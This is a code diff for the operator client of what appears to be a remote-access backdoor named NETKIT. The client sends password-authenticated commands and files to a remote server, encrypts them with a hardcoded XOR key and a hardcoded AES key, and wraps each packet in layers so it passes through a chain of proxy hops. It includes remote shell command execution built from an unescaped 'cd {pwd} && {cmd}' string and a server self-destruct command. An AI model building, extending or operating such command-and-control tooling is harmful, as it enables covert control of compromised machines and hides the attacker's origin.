@@ -25,39 +25,74 @@ class PacketReq:
         self.content = content
 
     def __bytes__(self):
-        return p8(self.auth_id) + self.password + p8(self.cmd_id) + self.content
+        return self.encrypt(p8(self.auth_id) + self.password + p8(self.cmd_id) + self.content)
+    
+    def encrypt(self, plaintext: bytes) -> bytes:
+        print = lambda *x: ...
+
+        data = xor(plaintext, b"NETKIT_XOR")[:len(plaintext)]
+        print('\nxor:', data)
+
+        padlen = 16-(len(data) % 16)
+        if padlen == 16:
+            padlen = 0
+
+        data += padlen.to_bytes(1, 'little') * padlen
+        print(f'\npad: {data} ({len(data)-padlen})')
+
+        iv = b"IV"*8
+        cipher = AES.new(b"AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD", AES.MODE_CBC, iv)
+        data = iv + cipher.encrypt(data)
+        print('\naes:', data)
+
+        return data
 
 
 class PacketRes:
-    def __init__(self, data: bytes):
+    def __init__(self, ciphertext: bytes):
+        data = self.decrypt(ciphertext)
         self.retv = int.from_bytes(data[:4], 'little', signed=True)
         self.domain = data[4]
         self.content = data[5:]
 
+    def decrypt(self, ciphertext: bytes) -> bytes:
+        print = lambda *x: ...
 
-def sendrecv(proxy_list: list[tuple[str, int]], sendbuf: bytes) -> bytes:
+        print("\n==========")
+        cipher = AES.new("AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD".encode(), AES.MODE_CBC, ciphertext[:16])
+        pad = cipher.decrypt(ciphertext[16:])
+        data = pad[:-ord(pad[len(pad)-1:])]
+        print('\naes:', data)
+
+        data = xor(data, b"NETKIT_XOR")[:len(data)]
+        print('\nxor:',  data)
+
+        return data
+
+
+def encapsulate_proxies(proxy_list: list[tuple[str, int]], packet: PacketReq) -> bytes:
+    for i, addr in enumerate(proxy_list[:-1]):
+        next_addr = proxy_list[i+1]
+        content = socket.inet_aton(next_addr[0])
+        port = socket.htons(next_addr[1]).to_bytes(2, 'little')
+        packet = PacketReq(0, packet.password, CMD_PROXY, content + port + bytes(packet))
+
+    return bytes(packet)
+
+
+def decapsulate_proxies(proxy_list: list[tuple[str, int]], packet: bytes) -> bytes:
+    for i, addr in enumerate(proxy_list[:-1]):
+        packet = PacketRes(packet).content
+
+    return packet
+
+
+def sendrecv(addr: tuple[str, int], sendbuf: bytes) -> bytes:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(proxy_list[0])
-
-    print = lambda *x: ...
+    s.connect(addr)
 
     data = sendbuf
     print('\nsend:', data)
-
-    data = xor(data, b"NETKIT_XOR")[:len(data)]
-    print('\nxor:', data)
-
-    padlen = 16-(len(data) % 16)
-    if padlen == 16:
-        padlen = 0
-
-    data += padlen.to_bytes(1, 'little') * padlen
-    print(f'\npad: {data} ({len(data)-padlen})')
-
-    iv = b"IV"*8
-    cipher = AES.new(b"AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD", AES.MODE_CBC, iv)
-    data = iv + cipher.encrypt(data)
-    print('\naes:', data)
 
     start = time.perf_counter()
     s.sendall(data)
@@ -69,16 +104,8 @@ def sendrecv(proxy_list: list[tuple[str, int]], sendbuf: bytes) -> bytes:
 
     if len(data) == 0:
         raise Exception("[!] auth failed")
-
-    print("\n==========")
-    print('recv:', repr(data))
-    cipher = AES.new("AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD".encode(), AES.MODE_CBC, data[:16])
-    pad = cipher.decrypt(data[16:])
-    data = pad[:-ord(pad[len(pad)-1:])]
-    print('\naes:', data)
-
-    data = xor(data, b"NETKIT_XOR")[:len(data)]
-    print('\nxor:',  data)
+    
+    print('recv:', data)
 
     return data
 
@@ -113,9 +140,12 @@ def upload(proxy_list: list[tuple[str, int]], password: bytes, filename_local: s
 
 
 def exec(proxy_list: list[tuple[str, int]], password: bytes, pwd: str, cmd: str):
-    packet = PacketReq(0, password, CMD_FILE_EXEC, f"cd {pwd} && {cmd}".encode())
+    raw_packet_send = PacketReq(0, password, CMD_FILE_EXEC, f"cd {pwd} && {cmd}".encode())
+    proxy_packet_enc: bytes = encapsulate_proxies(proxy_list, raw_packet_send)
+    raw_packet_recv = sendrecv(proxy_list[0], proxy_packet_enc)
+    proxy_packet_dec: bytes = decapsulate_proxies(proxy_list, raw_packet_recv)
 
-    rsp = PacketRes(sendrecv(proxy_list, bytes(packet)))
+    rsp = PacketRes(proxy_packet_dec)
     if rsp.retv == 0x7f00:
         print(f"command not found (something went wrong): {cmd.split(' ')[0]}")
         return
@@ -128,7 +158,7 @@ def exec(proxy_list: list[tuple[str, int]], password: bytes, pwd: str, cmd: str)
 def server_exit(proxy_list: list[tuple[str, int]], password):
     packet = PacketReq(0, password, CMD_EXIT, b"")
 
-    sendrecv(proxy_list, bytes(packet))
+    sendrecv(proxy_list[0], bytes(packet))
     print("[+] successfully self-destructed the server")
 
 
